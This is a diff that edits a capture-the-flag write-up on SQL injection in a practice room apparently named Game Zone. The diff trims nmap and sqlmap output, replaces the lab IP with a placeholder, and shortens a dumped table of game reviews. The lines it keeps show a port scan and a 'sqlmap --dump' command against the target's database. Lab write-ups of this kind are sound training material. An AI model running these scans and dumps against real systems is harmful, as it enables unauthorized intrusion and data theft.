@@ -5,20 +5,13 @@ This room will cover SQLi (exploiting this vulnerability manually and via SQLMap
 
 First quick NMAP scan:
 ```
-nmap -Pn -sV 10.67.177.222
-Starting Nmap 7.80 ( https://nmap.org ) at 2026-04-24 19:34 BST
-mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
-mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
-Nmap scan report for 10.67.177.222
-Host is up (0.00030s latency).
-Not shown: 998 closed ports
+nmap -Pn -sV <targetIP>
+...
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
 80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 7.68 seconds
+...
 ```
 Looks like just port 22 and 80.
 
@@ -68,10 +61,6 @@ SQLMap will now try different methods and identify the one thats vulnerable. Eve
 ```
 ┌──(hacktopuser㉿hacktop)-[/mnt/VBoxShare/CTF]
 └─$ sqlmap -r /mnt/CTF/Game_Zone/request.txt --dbms=mysql --dump
-        ___
-       __H__                                                                                        ___ ___[,]_____ ___ ___  {1.9.8#stable}                                                           |_ -| . [']     | .'| . |                                                                          
-|___|_  ["]_|_|_|__,|  _|                                                                          
-      |_|V...       |_|   https://sqlmap.org                                                                                 
 ...
 for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] y
 ...
@@ -84,11 +73,11 @@ Table: post
 +----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
 | id | name                           | description                                                                                                                                                                                            |
 +----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
-| 1  | Mortal Kombat 11               | Its a rare fighting game that hits just about every note as strongly as Mortal Kombat 11 does. Everything from its methodical and deep combat.                                                         |
-| 2  | Marvel Ultimate Alliance 3     | Switch owners will find plenty of content to chew through, particularly with friends, and while it may be the gaming equivalent to a Hulk Smash, that isnt to say that it isnt a rollicking good time. |
-| 3  | SWBF2 2005                     | Best game ever                                                                                                                                                                                         |
-| 4  | Hitman 2                       | Hitman 2 doesnt add much of note to the structure of its predecessor and thus feels more like Hitman 1.5 than a full-blown sequel. But thats not a bad thing.                                          |
-| 5  | Call of Duty: Modern Warfare 2 | When you look at the total package, Call of Duty: Modern Warfare 2 is hands-down one of the best first-person shooters out there, and a truly amazing offering across any system.                      |
+| 1  | Mortal Kombat 11               | Its a rare fighting game ...                                                         |
+| 2  | Marvel Ultimate Alliance 3     | Switch owners will find p... |
+| 3  | SWBF2 2005                     | Best game ever, meh...                                                                                                                                                                                         |
+| 4  | Hitman 2                       | Hitman 2 doesnt add much of note ...                                          |
+| 5  | Call of Duty: Modern Warfare 2 | When you look at the total package, ...                      |
 +----+--------------------------------+---------------------------------------------------------
 ...
 [03:13:03] [INFO] table 'db.post' dumped to CSV file '/home/hacktopuser/.local/share/sqlmap/output/<TargetIP>/dump/db/post.csv'                      ...
